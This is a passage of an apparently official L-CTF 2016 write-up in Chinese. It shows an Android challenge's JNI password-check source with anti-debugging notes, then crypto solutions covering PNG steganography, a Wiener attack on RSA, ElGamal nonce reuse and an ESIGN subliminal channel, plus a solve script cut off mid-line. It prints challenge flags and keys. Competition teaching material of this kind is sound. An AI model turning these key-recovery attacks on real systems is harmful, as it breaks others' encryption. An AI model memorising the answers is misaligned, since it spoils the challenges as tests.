plain">]&nbsp;&amp;&nbsp;</code><code class="java value">0xc0</code><code class="java plain">)&nbsp;&gt;&gt;&nbsp;</code><code class="java value">6</code><code class="java plain">);</code></div><div class="line number34 index33 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">char_array_4[</code><code class="java value">3</code><code class="java plain">]&nbsp;=&nbsp;char_array_3[</code><code class="java value">2</code><code class="java plain">]&nbsp;&amp;&nbsp;</code><code class="java value">0x3f</code><code class="java plain">;</code></div><div class="line number35 index34 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">for</code>&nbsp;<code class="java plain">(j&nbsp;=&nbsp;</code><code class="java value">0</code><code class="java plain">;&nbsp;(j&nbsp;&lt;&nbsp;i&nbsp;+&nbsp;</code><code class="java value">1</code><code class="java plain">);&nbsp;j++)</code></div><div class="line number36 index35 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">ret&nbsp;+=&nbsp;chars[char_array_4[j]];</code></div><div class="line number37 index36 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">while</code><code class="java plain">((i++&nbsp;&lt;&nbsp;</code><code class="java value">3</code><code class="java plain">))</code></div><div class="line number38 index37 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">ret&nbsp;+=&nbsp;</code><code class="java string">'.'</code><code class="java plain">;</code></div><div class="line number39 index38 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div><div class="line number40 index39 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">return</code>&nbsp;<code class="java plain">ret;</code></div><div class="line number41 index40 alt2"><code class="java plain">}</code></div><div class="line number42 index41 alt1"><code class="java keyword">static</code>&nbsp;<code class="java keyword">const</code>&nbsp;<code class="java keyword">char</code>&nbsp;<code class="java plain">*handlePasswd(</code><code class="java keyword">char</code><code class="java plain">*&nbsp;yourinput){</code></div><div class="line number43 index42 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">char</code><code class="java plain">*&nbsp;input;</code></div><div class="line number44 index43 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">std::string&nbsp;output&nbsp;=&nbsp;</code><code class="java string">""</code><code class="java plain">;</code></div><div class="line number45 index44 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">input&nbsp;=&nbsp;yourinput;</code></div><div class="line number46 index45 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code>&nbsp;<code class="java plain">(NULL&nbsp;==&nbsp;input)&nbsp;{</code></div><div class="line number47 index46 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">return</code>&nbsp;<code class="java plain">NULL;</code></div><div class="line number48 index47 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div><div class="line number49 index48 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">int</code>&nbsp;<code class="java plain">low&nbsp;=&nbsp;</code><code class="java value">0</code><code class="java plain">;</code></div><div class="line number50 index49 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">size_t&nbsp;hight&nbsp;=&nbsp;strlen(input)&nbsp;-&nbsp;</code><code class="java value">1</code><code class="java plain">;</code></div><div class="line number51 index50 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">while</code>&nbsp;<code class="java plain">(low&nbsp;&lt;&nbsp;hight)&nbsp;{</code></div><div class="line number52 index51 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">char</code>&nbsp;<code class="java plain">tmp&nbsp;=&nbsp;input[low];</code></div><div class="line number53 index52 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">input[low]&nbsp;=&nbsp;input[hight];</code></div><div class="line number54 index53 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">input[hight]&nbsp;=&nbsp;tmp;</code></div><div class="line number55 index54 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">++low;</code></div><div class="line number56 index55 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">--hight;</code></div><div class="line number57 index56 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div><div class="line number58 index57 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">output.append(input);</code></div><div class="line number59 index58 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">return</code>&nbsp;<code class="java plain">encrypt(output.c_str(),&nbsp;(unsigned&nbsp;</code><code class="java keyword">int</code><code class="java plain">)&nbsp;output.length()).c_str();</code></div><div class="line number60 index59 alt1"><code class="java plain">}</code></div><div class="line number61 index60 alt2"><code class="java plain">extern&nbsp;</code><code class="java string">"C"</code></div><div class="line number62 index61 alt1"><code class="java plain">jboolean</code></div><div class="line number63 index62 alt2"><code class="java plain">Java_com_example_ring_wantashell_Check_checkPasswd(JNIEnv*&nbsp;env,&nbsp;jobject&nbsp;jobject1,&nbsp;jstring&nbsp;input){</code></div><div class="line number64 index63 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">const</code>&nbsp;<code class="java keyword">char</code><code class="java plain">*&nbsp;pass;</code></div><div class="line number65 index64 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">jboolean&nbsp;iscopy;</code></div><div class="line number66 index65 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">const</code>&nbsp;<code class="java keyword">char</code><code class="java plain">*&nbsp;password;</code></div><div class="line number67 index66 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">pass&nbsp;=&nbsp;env-&gt;GetStringUTFChars(input,&nbsp;</code><code class="java keyword">false</code><code class="java plain">);</code></div><div class="line number68 index67 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">if</code>&nbsp;<code class="java plain">(pass&nbsp;==&nbsp;NULL&nbsp;){</code></div><div class="line number69 index68 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">return</code>&nbsp;<code class="java plain">(jboolean)</code><code class="java keyword">false</code><code class="java plain">;</code></div><div class="line number70 index69 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">}</code></div><div class="line number71 index70 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">char</code><code class="java plain">*&nbsp;pas&nbsp;=&nbsp;</code><code class="java keyword">new</code>&nbsp;<code class="java keyword">char</code><code class="java plain">[</code><code class="java value">33</code><code class="java plain">];</code></div><div class="line number72 index71 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">strcpy(pas,&nbsp;pass);</code></div><div class="line number73 index72 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">password&nbsp;=&nbsp;handlePasswd(pas);</code></div><div class="line number74 index73 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">env-&gt;ReleaseStringUTFChars(input,&nbsp;pass);</code></div><div class="line number75 index74 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java keyword">return</code>&nbsp;<code class="java plain">(jboolean)&nbsp;(password&nbsp;==&nbsp;secret);</code></div><div class="line number76 index75 alt1"><code class="java plain">}</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">本题主要是静态反汇编分析能力。EditText获取选手输入后，将其<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">substring(5, 37)</span>得到flag，亦为即将传入native方法的值，虽然没有检测其前5及后边的字符值，但对输入长度做了限定；<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">native checkPasswd(String input)</span>方法则分为两部分，一是对input做简单处理，即倒序；二则是一个base64编码，只是我把'='用'.'来替换了；input编码后直接与密文secret进行比对，所以程序内部并没有解密方法。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">Jni_OnLoad</span><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">函数内部则是简单的<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">ptrace</span>反调试和反模拟器的一些函数以及一个对dex的SMC，即将内存中的<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">form</span>函数的字节码用<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">f0rm</span>函数的来替换（其余两个是我后来觉得只有<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">form</span>和<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">f0rm</span>的话太过直接，于是添加进去的无用函数）。这种对dex字节码的SMC是一种Android低版本的方法（version &lt; 5），所以高系统版本手机上会crash掉...但由于只使用了AVD的模拟器及一款三星Android 4.4.4手机做测试，没有对其他机型做适配，所以有选手反应说在nexus5 4.4.3上也出了问题...虽然尽量使用了能够静态分析出的SMC方案，但仍在此表示诚挚的歉意...（请务必不要寄刀片...）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">分析出<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">encrypt</span>是base64的话就很简单，只需将<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">secret</span>的'.'换为'='，然后<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">base64.b64decode(secret)</span>即可得到倒序的flag，为：<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">iwantashellbecauseidonthaveitttt</span></span></p><p style="text-indent: 2em; text-align: left;"><br></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">crypt 200</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">写在前面……</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp; 这道题本计划让参赛选手自己写脚本爆破的，然而ZZ出题人不小心把密文给的长了……于是几乎所有队伍都是在线解出来的……几乎成了签到题……出题人表示很悲伤……</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">出题人计划中的解题思路：</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp; 首先通过自己写脚本/在线工具，查出密钥很可能为两段，分别是 7、13 。然后开始爆破短密码，每爆破一位检查一次是否正确。这里有一个小点：对7位密钥爆破时，只需把第一位预设为'a'，爆破后六位就可以。用python多线程实现，大概需要3-4小时即可得出结果，Ｃ语言会更快。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp; 怨念の出题人：只取密文中的前91个字母，你给我在线解啊在线解啊(〒︿〒)</span></p><p style="text-indent: 2em; text-align: left;"><br></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">crypt 450</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">拿到流量包，只有三个http请求：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">主页</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">网站图标(favicon.ico)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">下载了一个加密的zip文件(Somethingneeded.zip)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">压缩包有密码，爆破不出来也没有提示；主页上就一个下载压缩包的链接，和一个网站图标的请求，然后看favicon.ico。一个简单的隐写，改了文件高度= =没有想到这里会卡主一部分人，估计解压出来压缩包的都卡在密码上，没解压开压缩包的，基本都卡在这个隐写上面了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">用010editor打开图片，并载入png模板。找到文件的宽高字段，修改高度为一个略大的值，比如400，重新计算CRC并用新得到的CRC值替换原来字段的CRC值保存文件，打开就会得到zip加密的key。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">修改前：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t011ad9302680a833e0.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t011ad9302680a833e0.png" title="t01e26bd63620f2de54.png" alt="http://p7.qhimg.com/t01e26bd63620f2de54.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">修改后：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t0107dbc651d9a5b596.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t0107dbc651d9a5b596.png" title="t018f9da3aa0558d28f.png" alt="http://p4.qhimg.com/t018f9da3aa0558d28f.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t0180732c3523650dfa.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t0180732c3523650dfa.png" title="t013dece75651ddebc8.png" alt="http://p7.qhimg.com/t013dece75651ddebc8.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">用得到的key解压压缩包会得到三个文件。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1. 发现RSA公钥中存在低解密指数攻击（加密指数过长）：通过Wiener Attack 攻击公钥n, e ，得到RSA私钥。恢复出RSA明文：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">AES_key:&gt;&gt;JfffOaqYHvuSIkfU</code></div><div class="line number2 index1 alt1"><code class="plain plain">First&nbsp;sign:&nbsp;ElGamal;&nbsp;First&nbsp;HASH:&nbsp;SHA[in&nbsp;python:&gt;&gt;int(SHA.new(msg).digest().encode('hex'),16)]</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">2. 使用1.中得到的AES的密钥解密文本，得到：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ESIGN</code></div><div class="line number2 index1 alt1"><code class="plain plain">HASH:&nbsp;SHA</code></div><div class="line number3 index2 alt2"><code class="plain plain">Alice&nbsp;in&nbsp;Sun&nbsp;Sep&nbsp;25&nbsp;02:40:07&nbsp;CST&nbsp;2016</code></div><div class="line number4 index3 alt1"><code class="plain plain">in&nbsp;these&nbsp;Signatures,&nbsp;important&nbsp;things&nbsp;r&nbsp;different....but....they&nbsp;r&nbsp;one&nbsp;and&nbsp;the&nbsp;same.&nbsp;indeed.</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过1.中所给消息，知道本次信息传递中使用的是`elgamal`签名算法。发现几条对消息签名时使用了相同的随机指数（A值相同）。根据A,B,P,以及1.中给出的hash计算方法，解出`elgamal`的私钥。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3. 通过2中的AES明文，知道本次信息传递中使用的是`ESIGN`签名算法。用AES解密后，发现明文是两篇演讲的片段。发现没有找到flag，回头检查3，通过计算签名s的长度，发现其长度为4094位。长度有些诡异，怀疑用来计算N的私钥有问题。通过以前的积累，或查询资料，发现本次`esign`中存在阈下信道。通过2中所给信息，猜测本次阈下信道中的额外私钥r与2中`elgamal`签名的私钥相同。对3中签名信息计算后，得到信息：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">flag:&gt;&gt;p1eas3_b00m_**__b0om_shak4l4ka_1am_****</code></div><div class="line number2 index1 alt1"><code class="plain plain">hash:&gt;&gt;b96648cc3f097c6faf581386b97d7e043521abe2369d1141d9a98d4897770ea7</code></div><div class="line number3 index2 alt2"><code class="plain plain">map(lambda&nbsp;x:x&nbsp;in&nbsp;string.letters[:26]+string.digits,&nbsp;flag)==[True&nbsp;for&nbsp;x&nbsp;in&nbsp;len(flag)]</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过得到的信息得知：flag的格式、flag的hash值、flag包含的字符。其中，根据散列值长度得知，hash算法应为SHA256。此处有两种解法：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">　1. 猜测flag的值</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">　2. 爆破</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">爆破耗时：<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">in python &nbsp;7966.50890207s</span></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解密过程脚本：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">from</code>&nbsp;<code class="python plain">Crypto.Cipher&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python plain">AES</code></div><div class="line number2 index1 alt1"><code class="python keyword">from</code>&nbsp;<code class="python plain">Crypto.Util.number&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python plain">inverse</code></div><div class="line number3 index2 alt2"><code class="python keyword">from</code>&nbsp;<code class="python plain">Crypto.</code><code class="python functions">Hash</code>&nbsp;<code class="python keyword">import</code>&nbsp;<code class="python plain">SHA</code></div><div class="line number4 index3 alt1"><code class="python comments">#rsa&nbsp;wiener&nbsp;attack</code></div><div class="line number5 index4 alt2"><code class="python comments">#rsa</code></div><div class="line number6 index5 alt1"><code class="python plain">d</code><code class="python keyword">=</code><code class="python value">945479</code></div><div class="line number7 index6 alt2"><code class="python plain">n</code><code class="python keyword">=</code><code class="python value">97138137104734298609834482366162026304298592110475985436506028537069205049518477940234295052306979545838532836621897425238678644632407147169000035071022811912986002484126251044062768165713546731476185662130377342101286612617162668138061510373486561911394707269228925814230274314210636439524014517539501333347</code></div><div class="line number8 index7 alt1"><code class="python plain">RSA_cipher</code><code class="python keyword">=</code><code class="python plain">[</code><code class="python value">88338041376938401802720557408228704277670863496574655328421532326725843272097398245807134173312579420393982660449469103160527683780725884286927820971842125127589841694210130213315926335981438201260031871966789654511469636565529079969394168628995175878129596748889594295059700929788081323076914856088444245112L</code><code class="python plain">,&nbsp;</code><code class="python value">61799587191566341619854870153945004198553938077225303160352458773817261402958372192378106795721702756191976223720864957706672008373655798626158938618656502841851649551320659253777035402269371424057142314225517057707462842393420846653734853164705499492891578783074253284026413294114604336927568599227641318014L</code><code class="python plain">]</code></div><div class="line number9 index8 alt2"><code class="python keyword">for</code>&nbsp;<code class="python plain">x&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">RSA_cipher:</code></div><div class="line number10 index9 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python functions">hex</code><code class="python plain">(</code><code class="python functions">pow</code><code class="python plain">(x,d,n))[</code><code class="python value">2</code><code class="python plain">:</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">].decode(</code><code class="python string">'hex'</code><code class="python plain">)</code></div><div class="line number11 index10 alt2"><code class="python comments">#aes</code></div><div class="line number12 index11 alt1"><code class="python plain">AES_key</code><code class="python keyword">=</code><code class="python string">'JfffOaqYHvuSIkfU'</code></div><div class="line number13 index12 alt2"><code class="python plain">aes_cipher</code><code class="python keyword">=</code><code class="python plain">[</code><code class="python string">'ciY5/kGjPdhAKVrnhNdWnrPLTRxgYyBS7qMYrz2Ak0o=\n'</code><code class="python plain">,&nbsp;</code><code class="python string">'qogojMDs8nk9+xjtzaJ2as9heZ1hO4tU+lkWy5p6an0=\n'</code><code class="python plain">,&nbsp;</code><code class="python string">'KFcU6TOSA9pa1rhK7z4MbB2973DWjefjdtLpAL3e7j2kyKh958JjDgs4gP+z14Fu7C6u40ol/t2d\nm5MVgeY93g==\n'</code><code class="python plain">,&nbsp;</code><code class="python string">'EmS6a94W5adYv6t4lClWso8eBEc43Bv6UDf2di1eaS40jPfkKhplW2xZqhftGQSQxbXPRo7pkI7e\nItzc0WCy0P8TT49/UPAMF5b60gDZMPt2j/ZRAuHxaJzF8Cx2it7gKs24ncfTd4SOWe2u7MKOKw==\n'</code><code class="python plain">]</code></div><div class="line number14 index13 alt1"><code class="python keyword">for</code>&nbsp;<code class="python plain">x&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python plain">aes_cipher:</code></div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">aes</code><code class="python keyword">=</code><code class="python plain">AES.new(AES_key,&nbsp;AES.MODE_CBC,x[:</code><code class="python value">16</code><code class="python plain">])</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code>&nbsp;<code class="python plain">aes.decrypt(x.decode(</code><code class="python string">'base64'</code><code class="python plain">))[</code><code class="python value">16</code><code class="python plain">:]</code></div><div class="line number17 index16 alt2"><code class="python comments">#elgamal</code></div><div class="line number18 index17 alt1"><code class="python plain">y</code><code class="python keyword">=</code><code class="python value">15148966177463904691976929838930853269289042839863729153722159418042428750060107430271482040640819799571694807206565563732947531693110647584022938487969095426383780089637260478432928271983711941845660111527182345478689092328947780732610986992284917052181103606943301549620374333055713772173803160039045677747L</code></div><div class="line number19 index18 alt2"><code class="python plain">g</code><code class="python keyword">=</code><code class="python value">25986687973107588697969881578531976225371183716036966607566598597020466205189059529253570979189706405467377222766170735056450913652725357600357578278196605120029525929914741729624555676312392184452733004866834101377570297318905377030568966047530761331315780489316379915546238079764422405334804304898426687980L</code></div><div class="line number20 index19 alt1"><code class="python plain">p</code><code class="python keyword">=</code><code class="python value">137967888557999584952319237542893026336748210577336880254687758603509585370528901731055615450121641462482424970657347865301939510121259558782471038671268295347199943208985837721430708786848240150088389965993410045395623590020110797728504435013202372429725107610844546670040670171936933047396461805698152157887L</code></div><div class="line number21 index20 alt2"><code class="python plain">a</code><code class="python keyword">=</code><code class="python value">39370371870759685744880219013861529359618555030410863001040308371947410012054549207612071728536023322186748226046661353393772853562380526414095218658206970877514669689306990840319762479981191161383790605961521206224285819589569439347118291570125764824252249717974718794796429000637269474821559491639876277622L</code></div><div class="line number22 index21 alt1"><code class="python plain">b_1</code><code class="python keyword">=</code><code class="python value">134684485624161722987021635696340906125874242700255840489978717909572949629047583933623167185071756551222666372564819181853883708840908663577036374636521884329720103037550136452569114301719473556970058712470208671611709476886062032130414621155592035982216482184069779157329196503823026688539159075884112435996L</code></div><div class="line number23 index22 alt2"><code class="python plain">b_2</code><code class="python keyword">=</code><code class="python value">105396166206430883198614275890827062056159012286110042575572024146834036632816276753821090982097827834427186711544957971715438182849629129341938574550891409300133967462947765862253827035010131907704291025456105903654968880992395975177059676410502095248239091847873470990731624808614783122403783791697356313395L</code></div><div class="line number24 index23 alt1"><code class="python plain">m1</code><code class="python keyword">=</code><code class="python 